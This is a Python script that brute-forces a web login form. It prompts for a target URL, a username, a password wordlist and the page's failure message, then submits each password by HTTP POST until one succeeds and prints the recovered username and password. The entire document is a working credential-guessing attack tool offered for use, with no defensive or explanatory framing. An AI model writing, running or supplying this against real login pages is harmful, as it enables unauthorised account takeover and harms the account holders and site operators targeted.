import requests
from termcolor import colored

# Request user input for the necessary parameters
webpage_url = input('[+] Kindly provide the URL of the webpage: ')
account_username = input('[+] Please enter the username of the account to be brute-forced: ')
path_to_password_file = input('[+] Specify the path to the password file to be utilized: ')
unsuccessful_login_indicator = input('[+] Enter the string that appears when a login attempt is unsuccessful: ')

# Define the brute force function
def execute_brute_force(username, url):
    for potential_password in password_list:
        potential_password = potential_password.strip()
        print(colored(('Initiating attempt with: ' + potential_password), 'red'))
        payload = {'username': username, 'password': potential_password, 'Login': 'submit'}
        server_response = requests.post(url, data=payload)
        if unsuccessful_login_indicator in server_response.content.decode():
            continue
        else:
            print(colored(('[+] Successful identification of Username: ==> ' + username), 'green'))
            print(colored(('[+] Successful identification of Password: ==> ' + potential_password), 'green'))
            exit()

# Open the password file and execute the brute force function
with open(path_to_password_file, 'r') as password_list:
    execute_brute_force(account_username, webpage_url)

print('[!!] Password Not Found in Provided List')
